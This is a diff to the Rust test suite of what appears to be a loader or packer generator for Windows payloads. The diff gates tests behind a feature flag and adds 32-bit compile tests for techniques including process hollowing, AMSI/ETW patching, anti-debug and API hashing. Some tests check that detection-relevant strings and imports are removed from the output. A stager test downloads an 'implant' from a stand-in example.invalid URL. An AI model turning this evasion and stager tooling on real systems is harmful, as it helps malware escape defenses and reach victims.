@@ -774,7 +774,9 @@ fn verify_output_kind(path: &Path, kind: OutputKind) -> Result<()> {
 mod tests {
     use super::*;
 
+    #[cfg(feature = "live-tests")]
     use crate::plan::schema::PayloadFormat;
+    #[cfg(feature = "live-tests")]
     use crate::techniques::{RuntimeStep, TechniqueKind};
 
     #[test]
@@ -1127,8 +1129,9 @@ dependencies = [
     /// Marked `#[ignore]` because it requires `rustc` and the already-compiled
     /// dependencies. On Windows that is `cargo build`; on Linux/WSL it also
     /// requires `cargo build --target x86_64-pc-windows-gnu`. Run it with:
-    /// `cargo test -- --ignored`.
+    /// `cargo test --features live-tests -- --ignored`.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the compiled dependencies"]
     fn full_pipeline_generates_exe() {
         let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();
@@ -1194,6 +1197,7 @@ dependencies = [
     /// This is the real end-to-end validation of the feature. Marked
     /// `#[ignore]` for the same reasons as `full_pipeline_generates_exe`.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the compiled dependencies"]
     fn obfuscated_strings_absent_from_binary() {
         use crate::engine::obfuscation::{StringStrategy, StringsConfig};
@@ -1282,8 +1286,9 @@ dependencies = [
     ///
     /// This is the safety net that stops a new technique fragment from
     /// introducing a cleartext literal. Marked `#[ignore]` because it compiles
-    /// one stub per technique. Run it with `cargo test -- --ignored`.
+    /// one stub per technique. Run it with `cargo test --features live-tests -- --ignored`.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the compiled dependencies"]
     fn no_sensitive_literals_in_generated_stubs() {
         use crate::audit::{pe_info, strings};
@@ -1375,6 +1380,7 @@ dependencies = [
     /// it produces a PE. Marked `#[ignore]` because it needs `rustc` and the
     /// compiled dependencies.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the compiled dependencies"]
     fn custom_stub_compiles_to_pe() {
         let template = std::fs::read_to_string(
@@ -1430,6 +1436,7 @@ dependencies = [
     /// Builds a process-hollowing stub with the given syscall plan, writing
     /// `payload.bin` and the rendered stub into `build_dir`. Returns the path
     /// of the compiled exe. `payload` is the plaintext to pack.
+    #[cfg(feature = "live-tests")]
     fn build_hollowing_exe(
         build_dir: &Path,
         name: &str,
@@ -1486,6 +1493,7 @@ dependencies = [
     /// disappear, the NT names never appear in cleartext, and the output is
     /// still a PE. Marked `#[ignore]` because it compiles two stubs.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the compiled dependencies"]
     fn indirect_syscalls_remove_the_suspicious_imports() {
         use crate::audit::pe_info::{self, ImportItem};
@@ -1577,6 +1585,7 @@ dependencies = [
     /// compiles to a PE and leaks no NT names in cleartext. Marked `#[ignore]`
     /// because it compiles a stub.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the compiled dependencies"]
     fn tartarus_gate_stub_compiles_to_pe() {
         let build_dir =
@@ -1620,6 +1629,7 @@ dependencies = [
     /// `GetProcAddress`-based resolution. Marked `#[ignore]` because it
     /// compiles a stub.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the compiled dependencies"]
     fn api_hash_stub_compiles_to_pe() {
         let build_dir =
@@ -1671,6 +1681,7 @@ dependencies = [
     ///
     /// Marked `#[ignore]`; it only does something on a Windows host.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc, compiled deps and a Windows host with a desktop"]
     fn indirect_syscalls_binary_runs_on_windows() {
         if !cfg!(windows) {
@@ -1731,6 +1742,7 @@ dependencies = [
     /// custom template that ignores `$STEP_MODULES$` never pulls in a technique
     /// fragment, which is what lets the x86 toolchain be tested while every
     /// fragment is still x64-only.
+    #[cfg(feature = "live-tests")]
     fn render_custom(template: &str, pipeline: &[crate::techniques::RuntimeStep]) -> String {
         let plaintext: Vec<u8> = (0..64u32).map(|i| i as u8).collect();
         let key = crate::engine::crypto::generate_key();
@@ -1754,10 +1766,13 @@ dependencies = [
         .source
     }
 
-    /// Renders the builtin stub template for a pipeline, returning the source and
-    /// the ciphertext to write as `payload.bin` next to it (the builtin template
-    /// `include_bytes!`s the payload).
-    fn render_builtin(pipeline: &[crate::techniques::RuntimeStep]) -> (String, Vec<u8>) {
+    /// Renders the builtin stub template for a pipeline with an explicit payload
+    /// format (see [`render_builtin`]).
+    #[cfg(feature = "live-tests")]
+    fn render_builtin_for(
+        pipeline: &[crate::techniques::RuntimeStep],
+        format: PayloadFormat,
+    ) -> (String, Vec<u8>) {
         let template = std::fs::read_to_string(
             Path::new(env!("CARGO_MANIFEST_DIR"))
                 .join("src")
@@ -1774,7 +1789,7 @@ dependencies = [
             pipeline,
             &encrypted,
             "payload.bin",
-            PayloadFormat::Pe,
+            format,
             None,
             false,
         );
@@ -1789,11 +1804,26 @@ dependencies = [
         (source, encrypted.ciphertext)
     }
 
+    /// Renders the builtin stub template for a pipeline, returning the source and
+    /// the ciphertext to write as `payload.bin` next to it (the builtin template
+    /// `include_bytes!`s the payload).
+    #[cfg(feature = "live-tests")]
+    fn render_builtin(pipeline: &[crate::techniques::RuntimeStep]) -> (String, Vec<u8>) {
+        render_builtin_for(pipeline, PayloadFormat::Pe)
+    }
+
     /// Compiles `source` for i686 (writing `payload.bin` when the template needs
     /// it) and returns the parsed artifact.
+    #[cfg(feature = "live-tests")]
     fn compile_i686(source: &str, payload: Option<&[u8]>, name: &str) -> crate::engine::pe::PeInfo {
+        // `name` is not unique across tests: the technique sweep compiles the
+        // same technique as its per-technique test (both use `dotnet_hosting`,
+        // for example). A per-call counter keeps parallel runs from sharing —
+        // and wiping — each other's scratch directory.
+        static SCRATCH_SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+        let seq = SCRATCH_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
         let build_dir =
-            std::env::temp_dir().join(format!("picaro_i686_{name}_{}", std::process::id()));
+            std::env::temp_dir().join(format!("picaro_i686_{name}_{}_{seq}", std::process::id()));
         let _ = std::fs::remove_dir_all(&build_dir);
         std::fs::create_dir_all(&build_dir).unwrap();
 
@@ -1831,6 +1861,7 @@ dependencies = [
     /// the i686 target: `cargo build --target i686-pc-windows-msvc` (or
     /// `i686-pc-windows-gnu` off Windows).
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_an_i686_stub() {
         let template = std::fs::read_to_string(
@@ -1855,6 +1886,7 @@ dependencies = [
     /// `$IMPORTS_BLOCK$`; the template ignores `$STEP_MODULES$`, so no x64
     /// technique fragment is linked in.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_the_shared_blocks_for_i686() {
         const TEMPLATE: &str = r#"
@@ -1894,6 +1926,7 @@ $IMPORTS_BLOCK$
     /// M1: the reflective-loading fragment compiles for i686 — the PE32 mapper,
     /// the hand-defined 32-bit `IMAGE_TLS_DIRECTORY` and the x86 entry call.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_a_reflective_stub_for_i686() {
         let pipeline = vec![RuntimeStep::new(TechniqueKind::ReflectiveLoading {
@@ -1909,6 +1942,7 @@ $IMPORTS_BLOCK$
     /// M2: the process-hollowing fragment compiles for i686 — PE32 parsing,
     /// `CONTEXT32`, the `fs:[0x2C]` TLS array and the 32-bit `THREAD_BASIC_INFORMATION`.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_a_hollowing_stub_for_i686() {
         let pipeline = vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
@@ -1925,6 +1959,7 @@ $IMPORTS_BLOCK$
     /// the target-resident TLS prologue (hand-written x86 machine code that runs
     /// `TlsSetValue` + the payload's callbacks before the entry point).
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_a_pe_injection_stub_for_i686() {
         let pipeline = vec![RuntimeStep::new(TechniqueKind::PeInjection {
@@ -1941,6 +1976,7 @@ $IMPORTS_BLOCK$
     /// technique — `anti_debug`'s x86 debug-register `CONTEXT`, the arch-neutral
     /// AMSI/ETW patches and the `bouncer`'s Win32 checks.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_the_x86_preparations_for_i686() {
         use crate::techniques::{anti_debug, bouncer, patch_amsi, patch_etw, reflective_loading};
@@ -1977,6 +2013,7 @@ $IMPORTS_BLOCK$
     /// calls, the 16-byte `VARIANT` layout and the x86 `Invoke_3` ABI (the
     /// variant passed by value, not by reference as on x64).
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_a_dotnet_hosting_stub_for_i686() {
         let pipeline = vec![RuntimeStep::new(TechniqueKind::DotnetHosting {
@@ -1985,6 +2022,117 @@ $IMPORTS_BLOCK$
         let (source, ciphertext) = render_builtin(&pipeline);
 
         let info = compile_i686(&source, Some(&ciphertext), "dotnet_hosting");
+        assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
+        assert_eq!(info.arch(), Some(Arch::X86));
+    }
+
+    /// Compatibility net: **every** x86-capable technique renders and compiles for
+    /// i686, driven by the registry instead of a hardcoded list. A technique that
+    /// declares `WindowsX86` but emits an x64-only fragment fails here; the
+    /// x64-only set is asserted too, so dropping the capability is a deliberate
+    /// edit rather than a silent regression.
+    #[test]
+    #[cfg(feature = "live-tests")]
+    #[ignore = "requires rustc and the workspace built for the i686 target"]
+    fn every_x86_technique_compiles_for_i686() {
+        use crate::techniques::{Capability, RuntimeStep};
+
+        let mut x64_only: Vec<&str> = Vec::new();
+        let mut covered: Vec<&str> = Vec::new();
+        for def in crate::techniques::all() {
+            if !def.requires.contains(&Capability::WindowsX86) {
+                x64_only.push(def.name);
+                continue;
+            }
+            let step: RuntimeStep = serde_yml::from_str(def.params_example)
+                .unwrap_or_else(|e| panic!("{}: params_example does not parse: {e}", def.name));
+            let format = def.formats.first().copied().unwrap_or(PayloadFormat::Pe);
+            let (source, ciphertext) = render_builtin_for(std::slice::from_ref(&step), format);
+            let info = compile_i686(&source, Some(&ciphertext), def.name);
+            assert_eq!(
+                info.machine,
+                crate::engine::pe::IMAGE_FILE_MACHINE_I386,
+                "{}: the i686 stub did not come out as PE32",
+                def.name
+            );
+            covered.push(def.name);
+        }
+
+        x64_only.sort_unstable();
+        assert_eq!(
+            x64_only,
+            vec![
+                "hardware_breakpoints",
+                "sleep_obfuscation",
+                "stack_spoofing"
+            ],
+            "the x64-only set changed; update this assertion deliberately"
+        );
+        assert!(
+            covered.len() >= 25,
+            "only {} x86 techniques were covered",
+            covered.len()
+        );
+    }
+
+    /// The network stager's two transports: the child-process downloader
+    /// (`curl`) and the in-process WinHTTP fetch. Both have to type-check and
+    /// link for i686, where `extern "system"` is stdcall and pointers are four
+    /// bytes.
+    #[test]
+    #[cfg(feature = "live-tests")]
+    #[ignore = "requires rustc and the workspace built for the i686 target"]
+    fn compiles_both_stager_transports_for_i686() {
+        use crate::techniques::RuntimeStep;
+
+        for (downloader, name) in [("curl", "stager_curl"), ("winhttp", "stager_winhttp")] {
+            let yaml = format!(
+                "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/a.bin\"\n  downloader: {downloader}\n"
+            );
+            let step: RuntimeStep =
+                serde_yml::from_str(&yaml).unwrap_or_else(|e| panic!("{name}: {e}"));
+            let (source, ciphertext) =
+                render_builtin_for(std::slice::from_ref(&step), PayloadFormat::Pe);
+            let info = compile_i686(&source, Some(&ciphertext), name);
+            assert_eq!(
+                info.machine,
+                crate::engine::pe::IMAGE_FILE_MACHINE_I386,
+                "{name}: the i686 stub did not come out as PE32"
+            );
+        }
+    }
+
+    /// The .NET acceptance shape for x86: every x86-capable Preparation plus a
+    /// 32-bit C# payload (`dotnet_hosting`) in **one** stub, so the interactions
+    /// (the syscall union, helper names, the shared blocks) are compiled too, not
+    /// just each technique alone.
+    ///
+    /// This is a *compile* net for the combination a 32-bit managed tool uses; it
+    /// does not claim the combination is semantically sound (a plan still has to
+    /// order its steps correctly).
+    #[test]
+    #[cfg(feature = "live-tests")]
+    #[ignore = "requires rustc and the workspace built for the i686 target"]
+    fn every_x86_preparation_compiles_with_dotnet_hosting_for_i686() {
+        use crate::techniques::{Capability, Category, RuntimeStep, TechniqueKind};
+
+        let mut pipeline: Vec<RuntimeStep> = Vec::new();
+        for def in crate::techniques::all() {
+            if def.category != Category::Preparation
+                || !def.requires.contains(&Capability::WindowsX86)
+            {
+                continue;
+            }
+            let step: RuntimeStep = serde_yml::from_str(def.params_example)
+                .unwrap_or_else(|e| panic!("{}: params_example does not parse: {e}", def.name));
+            pipeline.push(step);
+        }
+        pipeline.push(RuntimeStep::new(TechniqueKind::DotnetHosting {
+            params: crate::techniques::dotnet_hosting::Params::default(),
+        }));
+
+        let (source, ciphertext) = render_builtin_for(&pipeline, PayloadFormat::Dotnet);
+        let info = compile_i686(&source, Some(&ciphertext), "x86_dotnet_stack");
         assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
         assert_eq!(info.arch(), Some(Arch::X86));
     }
